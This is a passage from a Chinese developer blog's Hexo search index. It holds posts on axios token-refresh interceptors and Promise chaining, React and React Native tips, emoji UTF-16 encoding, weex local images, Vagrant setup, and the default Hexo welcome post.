keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> instance<span class="token punctuation">;</span></code></pre><p>核心代码：</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 1. 保存 pendding 状态的 Promise 到数组 requests 里面</span><span class="token keyword">const</span> retryOriginalRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>resolve <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  requests<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>token <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    config<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"X-Token"</span><span class="token punctuation">]</span> <span class="token operator">=</span> token<span class="token punctuation">;</span>    <span class="token function">resolve</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 2. 执行 pendding 的promise ，状态转为 resolve</span>requests<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>cb <span class="token operator">=</span><span class="token operator">></span> <span class="token function">cb</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>参考文章：<a href="https://juejin.im/post/5dcac7686fb9a04a9e37b595" target="_blank" rel="noopener">axios 如何利用 promise 无痛刷新 token（二）</a></p><p>我在如何保存<code>Promise</code>,后续如何释放<code>Promise</code> 这里卡住了，他的实现比较巧妙。</p><ol><li>保存请求的 config 的 Promise 到数组中</li><li>在刷新 token 之后，再执行修改 Promise 状态</li></ol><p>然鹅，你以为我懂了…其实我还是懵逼的…</p><p><img src="/images/1-1578487578225.png" alt="奴家不会啊"></p><h2 id="如何理解-Promise"><a href="#如何理解-Promise" class="headerlink" title="如何理解 Promise"></a>如何理解 Promise</h2><blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> retryOriginalRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>resolve <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  requests<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>token <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 因为config中的token是旧的，所以刷新token后要将新token传进来</span>    config<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"X-Token"</span><span class="token punctuation">]</span> <span class="token operator">=</span> token<span class="token punctuation">;</span>    <span class="token function">resolve</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> retryOriginalRequest<span class="token punctuation">;</span></code></pre><p>这里返回的是 promise？？？</p><p>一般我们不是返回的 config 吗？返回 Promise 作甚？？？</p></blockquote><p>在学习<code>axios</code>源码的过程中，找到了答案。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">InterceptorManager</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">private</span> interceptors<span class="token punctuation">:</span> Array<span class="token operator">&lt;</span>Interceptor<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token operator">|</span> <span class="token keyword">null</span><span class="token operator">></span>  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>interceptors <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 使用拦截器</span>  <span class="token function">use</span><span class="token punctuation">(</span>resolved<span class="token punctuation">:</span> ResolvedFn<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">,</span> rejected<span class="token operator">?</span><span class="token punctuation">:</span> RejectedFn<span class="token punctuation">)</span><span class="token punctuation">:</span> number <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      resolved<span class="token punctuation">,</span>      rejected    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span>  <span class="token punctuation">}</span>  <span class="token function">forEach</span><span class="token punctuation">(</span>fn<span class="token punctuation">:</span> <span class="token punctuation">(</span>interceptor<span class="token punctuation">:</span> Interceptor<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>interceptor <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>interceptor <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">fn</span><span class="token punctuation">(</span>interceptor<span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token function">eject</span><span class="token punctuation">(</span>id<span class="token punctuation">:</span> number<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>interceptors<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>interceptors<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>执行流程：</p><pre class=" language-js"><code class="language-js"> <span class="token comment" spellcheck="true">//  链式调用</span>    <span class="token keyword">const</span> chain<span class="token punctuation">:</span> PromiseChain<span class="token operator">&lt;</span>any<span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        resolved<span class="token punctuation">:</span> dispatchRequest<span class="token punctuation">,</span>        rejected<span class="token punctuation">:</span> undefined      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>interceptor <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//  后添加先执行</span>      chain<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>interceptor<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>response<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>interceptor <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//  先添加先执行</span>      chain<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>interceptor<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> promise <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>chain<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token punctuation">{</span> resolved<span class="token punctuation">,</span> rejected <span class="token punctuation">}</span> <span class="token operator">=</span> chain<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!</span>      promise <span class="token operator">=</span> promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>resolved<span class="token punctuation">,</span> rejected<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> promise</code></pre><p>基本流程：</p><ol><li>使用 use 方法，使用拦截器，拦截器被 push 到<code>interceptors</code>中进行管理</li><li>合并基本配置之后，设置调用链<code>chain</code>,请求拦截器，从后往前<code>unishift</code>到 chain 中，响应拦截器被<code>push</code>到<code>chain</code>中，中间则是，调用执行方法，也就是<code>dispatchRequest</code></li><li>这样就保证了调用顺序，请求拦截器 -&gt;执行调用方法 -&gt;响应拦截器</li><li>数据的流转，全部是通过<code>promise</code>传递，这里<code>while</code>方法，还是递归</li></ol><h2 id="理解-axios-中的-Promise"><a href="#理解-axios-中的-Promise" class="headerlink" title="理解 axios 中的 Promise"></a>理解 axios 中的 Promise</h2><p>再回头看官方的示例：</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// Add a request interceptor</span>axios<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>  <span class="token keyword">function</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Do something before request is sent</span>    <span class="token keyword">return</span> config<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token keyword">function</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Do something with request error</span>    <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>error 时候，返回 reject，正常时候，只返回了 config。在下一步的执行中，实际变成了</p><pre class=" language-js"><code class="language-js">promise <span class="token operator">=</span> promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token function">resolve</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">,</span> rejected<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>通过一个问题去阅读源码，再去理解基础知识。有的知识点是知道了，有的是会用了，然而，并没有真正的理解，想举一反三，难呐 😭</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> promise </tag>
            
            <tag> axios </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编码点滴:第一期</title>
      <link href="/2019/12/08/anything/bian-ma-dian-di-di-yi-qi/"/>
      <url>/2019/12/08/anything/bian-ma-dian-di-di-yi-qi/</url>
      
        <content type="html"><![CDATA[<p>本周遇到几个有意思的问题。下面一一记录。</p><ol><li><p>（css）使用flex布局，如何保证上下行之间间距，并且最后一行和容器空间为0</p><p>元素之间使用margin-bottom保持距离，最后一行元素的距离，使用外层的负margin抵消</p><iframe scrolling="no" width="100%" height="300" src="https://jsfiddle.net/pL28utya/embedded/html,css,result/dark" frameborder="0" loading="lazy" allowfullscreen></iframe></li></ol><ol start="2"><li><p>（react）如何理解组件里面的普通函数和箭头函数</p><p>参考：<a href="https://www.zhihu.com/question/59025982" target="_blank" rel="noopener">https://www.zhihu.com/question/59025982</a></p><p>简单来说：</p><p>普通函数 <code>Foo.prototype.a = function(){}</code></p><p>箭头函数</p><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Foo</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span> a<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>普通函数挂载在原型上面，箭头函数挂载在对象上面。使用箭头函数绑定不需要使用<code>bind</code>，比较方便。</p></li><li><p>react native <code>keybordWillShow</code> 安卓是监听不到的，<code>statusbar</code>中<code>barStyle</code>在安卓上面也可以用，需要安卓6.0+</p></li><li><p>react-navigation </p><p>页面销毁：</p><p>a-&gt;b ：不会执行页面销毁事件</p><p>b返回a：执行b页面销毁事件</p></li><li><p>前端处理emoji表情 😀</p><p>正常应该数据库保存emoji表情，数据库使用<code>utf8mp4</code>，最完美的解决方案。</p><p>但是有时候，数据库是以前的，不可能变更，这时候前端可以把emoji转成utf-16，然后传给后端。可以直接使用<a href="https://github.com/channg/umoji" target="_blank" rel="noopener">umoji</a>的<code>emojiToUnicode</code>方法。</p></li></ol><p>   验证utf-16是否正确：<a href="https://www.browserling.com/tools/utf16-decode" target="_blank" rel="noopener">https://www.browserling.com/tools/utf16-decode</a></p><p>   前端如何解析这个utf-16 呢？<a href="https://www.jianshu.com/p/432425a02b59" target="_blank" rel="noopener">https://www.jianshu.com/p/432425a02b59</a></p><p>   编码解码函数：</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 编码</span><span class="token keyword">function</span> <span class="token function">utf16toEntities</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">var</span> patt<span class="token operator">=</span><span class="token regex">/[\ud800-\udbff][\udc00-\udfff]/g</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 检测utf16字符正则 </span>        str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>patt<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">{</span>                 <span class="token keyword">var</span> H<span class="token punctuation">,</span> L<span class="token punctuation">,</span> code<span class="token punctuation">;</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>char<span class="token punctuation">.</span>length<span class="token operator">===</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                     H <span class="token operator">=</span> char<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 取出高位 </span>                    L <span class="token operator">=</span> char<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 取出低位 </span>                    code <span class="token operator">=</span> <span class="token punctuation">(</span>H <span class="token operator">-</span> <span class="token number">0xD800</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x400</span> <span class="token operator">+</span> <span class="token number">0x10000</span> <span class="token operator">+</span> L <span class="token operator">-</span> <span class="token number">0xDC00</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 转换算法 </span>                    <span class="token keyword">return</span> <span class="token string">"&amp;#"</span> <span class="token operator">+</span> code <span class="token operator">+</span> <span class="token string">";"</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                  <span class="token keyword">return</span> char<span class="token punctuation">;</span>                 <span class="token punctuation">}</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> str<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 解码</span><span class="token keyword">function</span> <span class="token function">uncodeUtf16</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex">/\&amp;#.*?;/g</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> result <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>reg<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> H<span class="token punctuation">,</span>L<span class="token punctuation">,</span>code<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>char<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">9</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>                code <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>char<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/[0-9]+/g</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                H <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span>code<span class="token number">-0x10000</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">0x400</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0xD800</span><span class="token punctuation">;</span>                L <span class="token operator">=</span> <span class="token punctuation">(</span>code <span class="token operator">-</span> <span class="token number">0x10000</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x400</span> <span class="token operator">+</span> <span class="token number">0xDC00</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">unescape</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token operator">+</span>H<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"%u"</span><span class="token operator">+</span>L<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> char<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>   但是但是，我解析的时候直接<code>JSON.parse(emoji)</code>也是可以的….试了偏僻的字符也可以，想搞明白为什么，没有找到文章=-=，不知道是埋了炸弹，还是狗屎运/(ㄒoㄒ)/~~</p>]]></content>
      
      
      <categories>
          
          <category> 编码点滴 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> react </tag>
            
            <tag> 周记 </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React Native 沉浸式状态栏和导航栏</title>
      <link href="/2019/11/24/front-end/reactnative-ding-bu-tu-pian-she-zhi/"/>
      <url>/2019/11/24/front-end/reactnative-ding-bu-tu-pian-she-zhi/</url>
      
        <content type="html"><![CDATA[<p>最近开始接触 React Native 的开发工作，对原生开发基本不了解，里面很多大大小小的坑。这次开发内容不是很复杂，数据交互不是非常多，主要是页面的布局。</p><h2 id="如何实现一个顶部隐藏状态栏并显示导航栏的页面？"><a href="#如何实现一个顶部隐藏状态栏并显示导航栏的页面？" class="headerlink" title="如何实现一个顶部隐藏状态栏并显示导航栏的页面？"></a>如何实现一个顶部隐藏状态栏并显示导航栏的页面？</h2><p><img src="/images/image-20191124220426772.png" alt="产品图片"></p><h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><ol><li><p>使用<code>Image</code>实现图片的显示，这里的图片最好使用<code>ImageBackground</code>组件，区别是<code>ImageBackground</code>可以嵌套其他组件</p></li><li><p>导航栏，我一开始是使用绝对定位的方式进行模拟的，但是越想越不对，实现肯定是有问题的，果然在<code>navigationOptions</code>中找到了<code>headerTransparent</code>属性，使用它，导航栏就可以实现透明显示。</p></li><li><p>状态栏透明显示：</p><pre class=" language-javascript"><code class="language-javascript">StatusBar<span class="token punctuation">.</span><span class="token function">setBackgroundColor</span><span class="token punctuation">(</span><span class="token string">"transparent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>StatusBar<span class="token punctuation">.</span><span class="token function">setTranslucent</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ol><h2 id="可用参考示例"><a href="#可用参考示例" class="headerlink" title="可用参考示例"></a>可用参考示例</h2><p><a href="https://github.com/Yaob1990/ReactNativePlayGround/blob/master/src/pages/Bar.js" target="_blank" rel="noopener">沉浸式状态栏</a></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ol><li><a href="https://www.jianshu.com/p/8075ccc84d07" target="_blank" rel="noopener">React Native 中的状态栏</a></li><li><a href="http://www.jeepxie.net/article/558579.html" target="_blank" rel="noopener">react native 沉浸式(透明)状态栏与标题导航栏</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 混合开发 </tag>
            
            <tag> React Native </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weex兼容本地图片</title>
      <link href="/2019/07/05/front-end/weex-jian-rong-ben-di-tu-pian/"/>
      <url>/2019/07/05/front-end/weex-jian-rong-ben-di-tu-pian/</url>
      
        <content type="html"><![CDATA[<p>做 weex 开发时候，不能使用本地图片，比较难受，必须使用网络图片。<br>那么能不能本地开发的图片自动转成网络图片？</p><h3 id="兼容本地图片实现"><a href="#兼容本地图片实现" class="headerlink" title="兼容本地图片实现"></a>兼容本地图片实现</h3><p>本地图片都存放在/src/image 文件夹，通过 tool.getImage(“logo.png”) 访问图片。在运行和部署时候，图片地址转成网络地址。<br>适合 web，不适合 app 场景。</p><h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p><a href="https://github.com/aocoding/weex-local-image" target="_blank" rel="noopener">weex-local-image</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weex </tag>
            
            <tag> 混合开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vagrant 学习记录</title>
      <link href="/2019/01/06/tool/vagrant-xue-xi-ji-lu/"/>
      <url>/2019/01/06/tool/vagrant-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>Vagrant 是virtualBox的命令行管理工具。<br>以前在mac平台我会用mamp pro 作为php的开发环境，但是非正版毕竟不太好，而且开发环境不贴近实际线上，折腾了一下，使用 vagrant 成功代替mamp pro。</p><h3 id="1-安装vagrant"><a href="#1-安装vagrant" class="headerlink" title="1. 安装vagrant"></a>1. 安装vagrant</h3><pre><code>`brew cask install virtualbox` 安装 virtualbox`brew cask install vagrant` 安装 vagrant</code></pre><h3 id="2-使用镜像初始化虚拟机"><a href="#2-使用镜像初始化虚拟机" class="headerlink" title="2. 使用镜像初始化虚拟机"></a>2. 使用镜像初始化虚拟机</h3><pre><code>下载地址找个百度盘吧，官方的我实在是没有拖动。。。一点都没动。。。`vagrant init precise64` 其中 `precise64` 表示你的镜像文件</code></pre><h3 id="3-常用设置"><a href="#3-常用设置" class="headerlink" title="3. 常用设置"></a>3. 常用设置</h3><pre><code>vagrant up  启动虚拟机vagrant ssh ssh进入虚拟机</code></pre><p>配置文件：<br>需要设置的地方其实很少，也就是网络端口转发和本地其他机器访问的公共ip<br><code>config.vm.synced_folder</code>表示本地和虚拟机同步的文件夹。</p><pre><code>  config.vm.network &quot;forwarded_port&quot;, guest: 80, host: 80  config.vm.network &quot;forwarded_port&quot;, guest: 8888, host: 8888  config.vm.network &quot;forwarded_port&quot;, guest: 888, host: 888  config.vm.network &quot;public_network&quot;, ip: &quot;192.168.1.120&quot;  config.vm.synced_folder &quot;../data&quot;, &quot;/vagrant_data&quot;</code></pre><p>在开发中，发现php不能自动生成tpl模板文件，需要设置同步文件夹的权限</p><pre><code>config.vm.synced_folder      &quot;your_folder&quot;(必须)   //物理机目录，可以是绝对地址或相对地址，相对地址是指相对与vagrant配置文件所在目录  ,&quot;vm_folder(必须)&quot;    // 挂载到虚拟机上的目录地址  ,create(boolean)--可选     //默认为false，若配置为true，挂载到虚拟机上的目录若不存在则自动创建  ,disabled(boolean):--可选   //默认为false，若为true,则禁用该项挂载  ,owner(string):&#39;www&#39;--可选   //虚拟机系统下文件所有者(确保系统下有该用户，否则会报错)，默认为vagrant  ,group(string):&#39;www&#39;--可选   //虚拟机系统下文件所有组( (确保系统下有该用户组，否则会报错)，默认为vagrant  ,mount_options(array):[&quot;dmode=775&quot;,&quot;fmode=664&quot;]--可选  dmode配置目录权限，fmode配置文件权限  //默认权限777  ,type(string):--可选     //指定文件共享方式，例如：&#39;nfs&#39;，vagrant默认根据系统环境选择最佳的文件共享方式</code></pre><p>我的配置：<br><code>config.vm.synced_folder &quot;../data&quot;, &quot;/vagrant_data&quot;,create: true, owner:&quot;www&quot;, group: &quot;www&quot;</code></p><h3 id="4-安装宝塔面板"><a href="#4-安装宝塔面板" class="headerlink" title="4. 安装宝塔面板"></a>4. 安装宝塔面板</h3><p>对我我等弱鸡鸡，宝塔面板还是很方便的。直接安装官方说明安装即可。注意，最后安装成功的ip是外网的ip，我们需要本地地址去访问。</p><h3 id="5-配置网站"><a href="#5-配置网站" class="headerlink" title="5. 配置网站"></a>5. 配置网站</h3><p>宝塔已经可以配置网站了。但是设置了之后，并不能访问。<br>需要去hosts 里面配置下网络地址，推荐使用<a href="https://oldj.github.io/SwitchHosts/" target="_blank" rel="noopener">SwitchHosts</a>去管理hosts。<br>eg：</p><pre><code># SwitchHosts!# vagrant127.0.0.1 www.test.com127.0.0.1 www.btadmin.com</code></pre><p>这时候就可以用<code>www.test.com</code>访问测试网站，用<code>www.btadmin.com</code>访问宝塔管理页面（需要在宝塔中配置）。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vagrant </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/09/12/hello-world/"/>
      <url>/2018/09/12/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
